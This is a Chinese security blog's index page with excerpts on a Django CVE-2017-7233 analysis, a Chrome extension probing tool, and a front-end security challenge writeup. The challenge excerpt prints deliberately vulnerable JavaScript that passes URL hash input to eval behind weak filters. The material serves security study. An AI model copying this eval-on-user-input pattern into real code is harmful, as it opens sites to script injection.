<h2 id="CVE-2017-7233分析">CVE-2017-7233分析</h2><p>国外安全研究员roks0n提供给Django官方的一个漏洞。</p>
<p><img src="http://ww1.sinaimg.cn/large/005y7Ba5gy1fekb8wapitj317d0pxage.jpg" alt=""></p>
    
  </section>
  
  <footer class="post-foot">
    <section class="post-foot-warp clear">
    
  <ul class="post-tag home-tag icon-tag fl">
    
      <li><a href="/tags/漏洞分析/">#漏洞分析</a></li>
    
  </ul>

    
      <a href="/2017/04/12/Django-CVE-2017-7233-bypass-is-safe-url-and-CVE-2017-7233-serve-open-url/#more" class="post-foot-link fr">阅读全文</a>
    
    </section>
  </footer>
  
</article>
  
    <article class="post">
  <header class="post-head">
    
  
    
      <h2 class="post-title">
        <a href="/2017/01/09/chrome-ext-spider-for-probe/">Chrome Extensions Spider &amp; Downloader</a>
      </h2>
    
  

    
<time datetime="2017-01-09T05:42:21.000Z" class="post-time">2017-01-09</time>

  </header>
  
  <section class="post-content typo">
    
      <p>可以先看一下n0r00t的文章的这一篇:<a href="https://www.n0tr00t.com/2017/01/09/Chrome-Extensions-Probe.html">https://www.n0tr00t.com/2017/01/09/Chrome-Extensions-Probe.html</a>。<br>以及用chrome试用一下最后的成果POC:<a href="http://server.n0tr00t.com/chrome/ext_probe.html">http://server.n0tr00t.com/chrome/ext_probe.html</a>，可以探测Chrome中已安装的扩展，配合Chrome扩展的一些漏洞，说不定能达到定点攻击的效果。<br>
    
  </section>
  
  <footer class="post-foot">
    <section class="post-foot-warp clear">
    
  <ul class="post-tag home-tag icon-tag fl">
    
      <li><a href="/tags/安全研究/">#安全研究</a></li>
    
  </ul>

    
      <a href="/2017/01/09/chrome-ext-spider-for-probe/#more" class="post-foot-link fr">阅读全文</a>
    
    </section>
  </footer>
  
</article>
  
    <article class="post">
  <header class="post-head">
    
  
    
      <h2 class="post-title">
        <a href="/2016/12/15/n0js-case1-writeup/">n0js case1 writeup</a>
      </h2>
    
  

    
<time datetime="2016-12-15T07:46:50.000Z" class="post-time">2016-12-15</time>

  </header>
  
  <section class="post-content typo">
    
      <p><em>跟着蘑菇老师学前端安全第一弹[二哈]</em></p>
<p>地址：</p>
<p><a href="http://server.n0tr00t.com/n0js/case1.html">http://server.n0tr00t.com/n0js/case1.html</a></p>
<p>主要代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">a1, a2, a3</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;a1&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">`<span class="subst">$&#123;a2&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.warn(<span class="string">`<span class="subst">$&#123;a3&#125;</span>`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> x = location.hash;</span><br><span class="line">l1 = <span class="built_in">escape</span>(x.split(<span class="string">'#'</span>)[<span class="number">1</span>]);</span><br><span class="line">l2 = x.split(<span class="string">'#'</span>)[<span class="number">2</span>];</span><br><span class="line">l3 = x.split(<span class="string">'#'</span>)[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">if</span> (l1 === <span class="string">'undefined'</span> || l1.length &gt;= <span class="number">30</span>) &#123;</span><br><span class="line">    a1</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span> (l2 === <span class="string">'undefined'</span> || l2.length &gt;= <span class="number">35</span>) &#123;</span><br><span class="line">    a2</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> v = [<span class="string">'1'</span>, l2, <span class="string">'3'</span>];</span><br><span class="line"><span class="keyword">if</span> (l1.indexOf(<span class="string">';'</span>) &gt;= <span class="number">0</span> || l2.indexOf(<span class="string">'('</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    a3</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span> (l2.indexOf(<span class="string">'/'</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    b1</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">if</span> (l3.indexOf(<span class="string">']'</span>) &gt;= <span class="number">0</span> || l3.length &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">    c3</span><br><span class="line">&#125;; &#123;</span><br><span class="line">    d = l1 + <span class="string">'v'</span> + l3.trim();</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">'test('</span> + d + <span class="string">')'</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
    
  </section>
  
  <footer class="post-foot">
    <section class="post-foot-warp clear">
    
  <ul class="post-tag home-tag icon-tag fl">
    
      <li><a href="/tags/前端安全/">#前端安全</a></li>
    
  </ul>

    
      <a href="/2016/12/15/n0js-case1-writeup/#more" class="post-foot-link fr">阅读全文</a>
    
    </section>
  </footer>
  
</article>
  
  
    <nav class="page-nav">
      
      
        <a href="/page/2/">下一页 &raquo;</a>
      
    </nav>
  
</section>
    </div>
  <!-- </div> -->
    <footer id="footer">
    <div class="foot-warp">
      <p>© 2014 Nearg1e</p>
    </div>
  </footer>
  <script src="/js/tools.js"></script>
  
  
  <script>
    var disqus_shortname = 'neargle';
    
    (function(){
      var dsq = document.createElement('script');
      dsq.type = 'text/javascript';
      dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
  </script>
  
  
</body>
</html>
